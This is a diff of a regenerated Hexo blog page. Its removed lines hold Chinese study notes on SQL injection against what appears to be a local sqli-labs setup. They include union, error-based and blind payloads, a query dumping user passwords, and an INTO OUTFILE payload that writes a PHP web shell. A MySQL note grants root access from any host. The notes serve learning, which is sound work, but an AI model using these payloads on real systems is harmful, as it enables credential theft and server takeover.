@@ -1,1265 +1,297 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/page/2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Hexo',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-01-09 19:32:50'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
     
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
 
-  
+        document.head.appendChild(script)
+      })
     
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="sql-Injections" class="h-entry article article-type-sql" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/12/24/Injections/" class="article-date">
-  <time class="dt-published" datetime="2023-12-24T02:11:30.000Z" itemprop="datePublished">2023-12-24</time>
-</a>
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
     
-  </div>
-  <div class="article-inner">
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/24/Injections/">Injections</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="SQL-Injections"><a href="#SQL-Injections" class="headerlink" title="SQL Injections"></a>SQL Injections</h1><h3 id="SQL-Injections-1"><a href="#SQL-Injections-1" class="headerlink" title="SQL Injections"></a>SQL Injections</h3><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行， 从而导致数据库受损</p>
-<p>判断列</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">order by ?</span><br></pre></td></tr></table></figure>
-
-<p>表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">union select ?,group_concat(table_name) ,? from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure>
-
-<p>列</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">union select ?, group_concat(column_name),? from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br></pre></td></tr></table></figure>
-
-<p>数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">union select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;</span><br></pre></td></tr></table></figure>
-
-<p>报错函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241014711.png" alt="image-20231224101408110"></p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241015528.png" alt="image-20231224101547828"></p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241016553.png" alt="image-20231224101608396"></p>
-<p>首先尝试：<br> ?id&#x3D;1’<br> ?id&#x3D;1”<br> 结果一：如果都报错<br> 判断闭合符为：整形闭合。</p>
-<p>结果二：如果单引号报错，双引号不报错。<br> 继续尝试<br> ?id&#x3D;1’ –-+<br> 结果1：无报错<br> 判断闭合符为：单引号闭合。<br> 结果2：报错<br> 判断闭合符可能为：单引号加括号。</p>
-<p>结果三：如果单引号不报错，双引号报错。<br> 继续尝试<br> ?id&#x3D;1” -–+<br> 结果1：结果无报错<br> 判断闭合符为：双引号闭合。<br> 结果2：报错<br> 判断闭合符可能为：双引号加括号。</p>
-<p>1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;and ascii(substring(database(),1,1))=115--+</span><br></pre></td></tr></table></figure>
-
-<p>2</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.70/sqli/Less-9/?id=1&#x27; and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- -</span><br><span class="line"></span><br><span class="line">SELECT BENCHMARK(1000000, SHA1(&#x27;Hello World&#x27;));</span><br><span class="line"></span><br><span class="line">and If(ascii(substr(database(),1,1))=114,1,BENCHMARK(5000000, SHA1(&#x27;Hello World&#x27;)))</span><br><span class="line"></span><br><span class="line">secure_file_priv=&quot;&quot;</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,@@datadir,@@secure_file_priv -- -</span><br><span class="line"></span><br><span class="line">http://192.168.2.70/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);  ?&gt;&quot; into outfile &quot;C:\\phpstudy_pro\\WWW\\phpinfo.php&quot; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.2.4/phpinfo.php/?q=systeminfo</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/24/Injections/" data-id="clr4slxw10000qofn0r2mbz7r" data-title="Injections" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/12/24/%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2023-12-24T02:01:43.000Z" itemprop="datePublished">2023-12-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/24/%E6%BC%8F%E6%B4%9E/">漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h3 id="准备php环境"><a href="#准备php环境" class="headerlink" title="准备php环境"></a>准备php环境</h3><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241002117.png" alt="image-20231220141612788"></p>
-<p>更改php版本</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241002003.png" alt="image-20231220201844929"></p>
-<p>打开apache2.4.39与mysql5.7.26</p>
-<h3 id="解压sqil到www根目录下"><a href="#解压sqil到www根目录下" class="headerlink" title="解压sqil到www根目录下"></a>解压sqil到www根目录下</h3><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241003252.png" alt="image-20231220202448726"></p>
-<h3 id="在火狐浏览器中安装hackbar扩展"><a href="#在火狐浏览器中安装hackbar扩展" class="headerlink" title="在火狐浏览器中安装hackbar扩展"></a>在火狐浏览器中安装hackbar扩展</h3><p>解压hackbar扩展压缩包</p>
-<p>打开火狐的扩展和主题</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241004154.png" alt="image-20231220203226906"></p>
-<p>从文件安装附加组件</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241005897.png" alt="image-20231220203451589"></p>
-<p>安装完成后通过f12打开开发者工具</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241005436.png" alt="image-20231220203656271"></p>
-<h3 id="nformation-schema在mysql多少版本后出现"><a href="#nformation-schema在mysql多少版本后出现" class="headerlink" title="nformation schema在mysql多少版本后出现"></a>nformation schema在mysql多少版本后出现</h3><p>INFORMATION_SCHEMA是一个MySQL特有的数据库模式，它提供了访问数据库元数据的能力，元数据如关于数据库的表、列、索引等的信息。INFORMATION_SCHEMA数据库包含多个只读的视图，这些视图实际上是对MySQL服务器<br>内部数据结构的直接映射。您可以运用标准的 SELECT 语句来查询这些视图以获取有关导入的数据库的信息。<br>INFORMATION_SCHEMA出现在MySQL5.0版本，作为对SQL 标准的一部分实现。对于5.0版本之前的MySQL版本，这些元数据信息只能通过SHOW语句或在特定的系统表如mysql数据库中的表来查询。自从<br>INFORMATION_SCHEMA引入之后，访问元数据变得更为统一和易于跨不同数据库系统进行迁移和查询。</p>
-<h3 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h3><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241006071.png" alt="image-20231224100622422"></p>
-<h3 id="SQL-Injections"><a href="#SQL-Injections" class="headerlink" title="SQL Injections"></a>SQL Injections</h3><p>浏览器输入虚拟机IP地址可以直接访问</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241006479.png" alt="image-20231220204114473"></p>
-<p>点击Setup&#x2F;reset Database for labs初始化数据库</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241007269.png" alt="image-20231220204323382"></p>
-<p>在phpstudy_pro目录下的Extensions中的MySQL5.7.26的bin目录之中打开cmd终端</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241007523.png" alt="image-20231220205650297"></p>
-<p>登入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241008573.png" alt="image-20231220205812905"></p>
-<p>链接数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use security</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241008688.png" alt="image-20231220210230287"></p>
-<p>1.<code>SELECT</code>子句用来选择来自一个或多个源的数据。函数<code>GROUP_CONCAT</code>用于合并同一组里面的列值为一个单一的字符串。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sql复制SELECT 1, GROUP_CONCAT(column_name), 3</span><br><span class="line">FROM information_schema.columns</span><br><span class="line">WHERE table_name = &#x27;users&#x27; AND table_schema = DATABASE();</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><code>SELECT 1</code>：直接选择数字 <code>1</code> 作为第一列的值，这通常用于测试或只需输出某些固定值的情况。</li>
-<li><code>GROUP_CONCAT(column_name)</code>：从数据库的 <code>INFORMATION_SCHEMA.COLUMNS</code> 表中选择所有以列 <code>table_name</code> 命名为 ‘<code>users</code>‘ 的行，然后使用 <code>GROUP_CONCAT</code> 函数将 <code>column_name</code> 列的所有值合网成一个逗号分隔的长字符串作为第二列的结果输出。</li>
-<li><code>3</code> 看起来是另一个直接选择的数字，作为第三列的一个固定值。</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br></pre></td></tr></table></figure>
-
-<p>2.**<code>SELECT 1, GROUP_CONCAT(table_name), 3</code>**：</p>
-<ul>
-<li><code>SELECT 1</code>：会在结果集的第一列返回数字 1。这里选择1通常用于测试或固定值输出，不涉及任何数据库数据检索。</li>
-<li><code>GROUP_CONCAT(table_name)</code>：<code>GROUP_CONCAT</code> 是一个聚合函数，它将由查询返回的所有 <code>table_name</code> 行串联成一个字符串，每个 <code>table_name</code> 之间默认使用英文逗号（,）作为分隔符。</li>
-<li><code>3</code>：和 <code>SELECT 1</code> 类似，会在列出结果集的第三列返回数字 3。</li>
-</ul>
-<p>**<code>FROM information_schema.tables</code>**：</p>
-<ul>
-<li>数据库的 <code>information_schema</code> 是一个特殊的 “虚拟” 数据库，提供了数据库的元数据，比如数据库的表、列、索引等，无论数据库中的具体内容是什么。数据库的 <code>tables</code> 视图包括了库中的所有表的信息。</li>
-</ul>
-<p>**<code>WHERE table_schema=database()</code>**：</p>
-<ul>
-<li><code>table_schema</code>：是 <code>information_schema.tables</code> 视图的一列，它包含了表所在的数据库名称。</li>
-<li><code>database()</code>：是一个函数，返回当前的数据库名称，此处作用是捕获当前（调用查询的客户端选择的）数据库的名字，从而 <code>WHERE</code> 条件筛选出该数据库中的所有表。</li>
-</ul>
-<p>返回每个匹配的数据库表名，串联成一个逗号分隔的字符串。这个字符串会出现在结果集的第二列，而第一列和第三列分别是硬编码的数字 1 和 3。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure>
-
-<p>3.该 SQL 语句使用 <code>GROUP_CONCAT</code> 函数来查询 <code>users</code> 表，并将每条记录的 <code>id</code>，<code>username</code> 与 <code>password</code> 字段连接在一起，连接字符为 <code>&quot;~&quot;</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sql复制SELECT GROUP_CONCAT(id, &quot;~&quot;, username, &quot;~&quot;, password) FROM users;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>GROUP_CONCAT</code> 是一个聚合函数，其功能是将多个行值连结成一个单独的字符串。</li>
-<li><code>id</code>, <code>username</code>, 和 <code>password</code> 是 <code>users</code> 表中的列名。</li>
-<li><code>&quot;~&quot;</code> 是连接各个列值时的分隔符。</li>
-</ul>
-<ol>
-<li>对表 <code>users</code> 中的每一行，该查询会取得 <code>id</code>, <code>username</code> 和 <code>password</code> 字段的值。</li>
-<li>然后，它会使用 <code>&quot;~&quot;</code> 作为分隔符，将这些值串联成一个字符串，比如如果某一行的 <code>id</code> 是 <code>1</code>，用户名(<code>username</code>)为 <code>JohnDoe</code> 而密码（<code>password</code>）为 <code>12345</code>，那么这行的输出将会是 <code>&quot;1~JohnDoe~12345&quot;</code>。</li>
-<li><code>GROUP_CONCAT</code> 函数接着将每一行根据上述方式生成的字符连接起来成一个大字符串，大字符串的每部分之间用逗号 <code>,</code> 分隔（这是 <code>GROUP_CONCAT</code> 默认的分隔符）。</li>
-</ol>
-<p>结果将返回所有 <code>users</code> 表行的集合，以一个大字符串表现，其中包含用 <code>&quot;~&quot;</code> 分隔并用逗号连接起来的每个用户的 <code>id</code>，<code>username</code>和 <code>password</code>数据。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;</span><br><span class="line"></span><br><span class="line">http://192.168.2.70/sqli/Less-1/?id=-1&#x27;union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database()-- -</span><br><span class="line"></span><br><span class="line">http://192.168.2.70/sqli/Less-1/?id=-1&#x27;union select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from users;-- -</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/24/%E6%BC%8F%E6%B4%9E/" data-id="clr4slxwg000nqofngglidlk5" data-title="漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-MySQL的基本操作" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/12/24/MySQL%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" class="article-date">
-  <time class="dt-published" datetime="2023-12-24T01:59:04.000Z" itemprop="datePublished">2023-12-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/24/MySQL%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/">MySQL的基本操作</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="MySQL的基本操作"><a href="#MySQL的基本操作" class="headerlink" title="MySQL的基本操作"></a>MySQL的基本操作</h3><h3 id="进入MySQL："><a href="#进入MySQL：" class="headerlink" title="进入MySQL："></a>进入MySQL：</h3><p>进入MySQL的根目录下的bin目录(……..\MySQL5.7.26\bin)，再在上面栏中输入cmd,点击Ente进入该目录下的命令行窗口</p>
-<p>或者选择直接打开命令行窗口cd到……..\MySQL5.7.26\bin目录下</p>
-<p>再在该窗口中输入，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql -u root -p #-u用于指定登录MySQL服务器的用户名。-p: 用于指定登录MySQL服务器的密码。</span><br></pre></td></tr></table></figure>
-
-<p>进入root用户的登陆界面</p>
-<p>输入密码，直接Enter登陆，请记住MySQL密码，密码忘记了在找回密码很麻烦很麻烦！且MySQL卸载容易残留内容。</p>
-<p>后续mysql数据库需要使用到远程操控（虚拟机之类）</p>
-<h3 id="解除远程限制"><a href="#解除远程限制" class="headerlink" title="解除远程限制"></a>解除远程限制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use mysql; # 使用mysql这个数据库</span><br><span class="line"></span><br><span class="line">update user set Host=&#x27;%&#x27; where User=&#x27;root&#x27;; # 更新&quot;user&quot;表中&quot;User&quot;列为&#x27;root&#x27;的行，将相应行												的&quot;Host&quot;列设置为&#x27;%&#x27;。给与root用户在任何主机访												问权限</span><br><span class="line">flush privileges; #重新加载授权表，使对用户权限的更改立即生效</span><br></pre></td></tr></table></figure>
-
-<p>use xxxx;  选择数据库,后续SQL操作将在xxx数据库中进行,它不会真正“使用”某个数据库,而是选择操作对象为某个数据库。</p>
-<p>然后就可以通过MySQL辅助软件从物理机连接虚拟机了，查询好虚拟机ip</p>
-<h3 id="MySQL数据库操作"><a href="#MySQL数据库操作" class="headerlink" title="MySQL数据库操作"></a>MySQL数据库操作</h3><p>MySQL名字要求：可以使用字母、数字和下划线，必须以字母开头，长度不能超过64个字符，MySQL对于英语大小写很敏感，取名尽量要有意义，避免使用MySQL保留字命名如SELECT、INSERT、UPDATE、DELETE等</p>
-<p>展示已有数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">show databases;</span><br></pre></td></tr></table></figure>
-
-<p>创建数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">create database database_name;</span><br><span class="line"></span><br><span class="line">create database test;</span><br></pre></td></tr></table></figure>
-
-<p>删除数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">drop database database_name;</span><br><span class="line"></span><br><span class="line">drop database test;</span><br></pre></td></tr></table></figure>
-
-<p>选择&#x2F;使用数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use database_name;</span><br><span class="line"></span><br><span class="line">use security;</span><br></pre></td></tr></table></figure>
-
-<p>显示库表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
-
-<h3 id="MySQL表操作"><a href="#MySQL表操作" class="headerlink" title="MySQL表操作"></a>MySQL表操作</h3><p>创建表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">create table table_name(列名 类型(长度要求),列名 类型(长度要求),......);</span><br><span class="line"></span><br><span class="line">create table student(id int,name char(10),age int,sex char(5));</span><br></pre></td></tr></table></figure>
-
-<p>查看表结构</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">desc table_name;</span><br><span class="line"></span><br><span class="line">desc student;</span><br></pre></td></tr></table></figure>
-
-<p>删除表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">drop table table_name;</span><br><span class="line"></span><br><span class="line">drop table student;</span><br></pre></td></tr></table></figure>
-
-<p>表添加列</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alter table table_name add 列名 类型(*);</span><br><span class="line"></span><br><span class="line">alter table student add height int(10);</span><br></pre></td></tr></table></figure>
